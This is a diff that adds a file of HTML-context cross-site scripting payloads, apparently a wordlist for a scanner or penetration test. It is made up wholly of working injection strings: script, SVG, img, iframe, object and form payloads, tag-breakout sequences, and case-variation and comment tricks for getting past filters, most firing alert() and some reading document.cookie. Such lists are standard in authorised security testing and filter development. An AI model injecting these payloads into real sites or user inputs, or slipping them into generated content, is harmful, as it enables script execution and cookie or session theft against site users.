@@ -1,0 +1,153 @@
+# HTML Context XSS Payloads
+# These payloads work when user input is reflected directly in HTML content
+
+# Basic script tags
+<script>alert(1)</script>
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<script>alert(window.origin)</script>
+
+# SVG-based XSS
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg onload=confirm(1)>
+<svg onload=prompt(1)>
+<svg><script>alert(1)</script></svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+
+# IMG-based XSS
+<img src=x onerror=alert(1)>
+<img src=x onerror=confirm(1)>
+<img src=x onerror=prompt(1)>
+<img src=x onerror=alert(document.domain)>
+<img/src=x onerror=alert(1)>
+<img src onerror=alert(1)>
+<img src=# onerror=alert(1)>
+<img src=/ onerror=alert(1)>
+<img src=`x` onerror=alert(1)>
+
+# BODY tag events
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1)>
+<body onhashchange=alert(1)>
+
+# IFRAME-based XSS
+<iframe src=javascript:alert(1)>
+<iframe onload=alert(1)>
+<iframe src="data:text/html,<script>alert(1)</script>">
+<iframe srcdoc="<script>alert(1)</script>">
+
+# Object and Embed tags
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<object data="data:text/html,<script>alert(1)</script>">
+
+# Video and Audio tags
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<video><source onerror=alert(1)>
+
+# Form-based XSS
+<form action=javascript:alert(1)><input type=submit>
+<button formaction=javascript:alert(1)>Click
+<form><button formaction=javascript:alert(1)>XSS
+
+# Details and Summary
+<details open ontoggle=alert(1)>
+<details><summary>XSS</summary><script>alert(1)</script></details>
+
+# Input field events
+<input onfocus=alert(1) autofocus>
+<input onblur=alert(1) autofocus><input autofocus>
+<input type=image src=x onerror=alert(1)>
+
+# Select and option
+<select onfocus=alert(1) autofocus>
+<select><option onerror=alert(1)>
+
+# Marquee and other tags
+<marquee onstart=alert(1)>XSS
+<marquee onscroll=alert(1)>XSS
+<marquee><script>alert(1)</script></marquee>
+
+# Math and other HTML5 tags
+<math><mtext></mtext><mi><script>alert(1)</script></mi></math>
+<math><mi xlink:href="javascript:alert(1)">XSS</mi></math>
+
+# Style-based XSS
+<style>@import'javascript:alert(1)';</style>
+<style>*{background:url('javascript:alert(1)')}</style>
+<style>body{background:url("javascript:alert(1)")}</style>
+
+# Link tag XSS
+<link rel=import href="data:text/html,<script>alert(1)</script>">
+<link rel=stylesheet href="javascript:alert(1)">
+
+# Meta refresh
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">
+
+# Table elements
+<table background=javascript:alert(1)>
+<td background=javascript:alert(1)>
+
+# Image with various protocols
+<img src="javascript:alert(1)">
+<img src="data:text/html,<script>alert(1)</script>">
+<img dynsrc="javascript:alert(1)">
+<img lowsrc="javascript:alert(1)">
+
+# Base tag
+<base href="javascript:alert(1)//">
+
+# Keygen tag
+<keygen onfocus=alert(1) autofocus>
+
+# Isindex
+<isindex action=javascript:alert(1) type=image>
+
+# Template tag
+<template><script>alert(1)</script></template>
+
+# Noscript
+<noscript><style>body{background:url('javascript:alert(1)')}</style></noscript>
+
+# XSS with HTML entities bypass
+<img src=x onerror="alert(1)">
+<img src=x onerror='alert(1)'>
+<img src=x onerror=`alert(1)`>
+
+# Event handlers without quotes
+<svg/onload=alert(1)//
+<svg onload=alert(1)//
+
+# Tag case variations
+<ScRiPt>alert(1)</sCrIpT>
+<IMG SRC=x ONERROR=alert(1)>
+<SvG OnLoAd=alert(1)>
+
+# Nested tags
+<p><script>alert(1)</script></p>
+<div><script>alert(1)</script></div>
+<span><script>alert(1)</script></span>
+
+# XSS with breaking out of tags
+</script><script>alert(1)</script>
+</title><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+</style><script>alert(1)</script>
+</noscript><script>alert(1)</script>
+
+# Foreign context
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+
+# Animation-based
+<set attributeName="innerHTML" to="<script>alert(1)</script>">
+<animate attributeName="href" values="javascript:alert(1)">
+
+# XSS with comments
+<!--><script>alert(1)</script>-->
+<!--><svg onload=alert(1)>-->
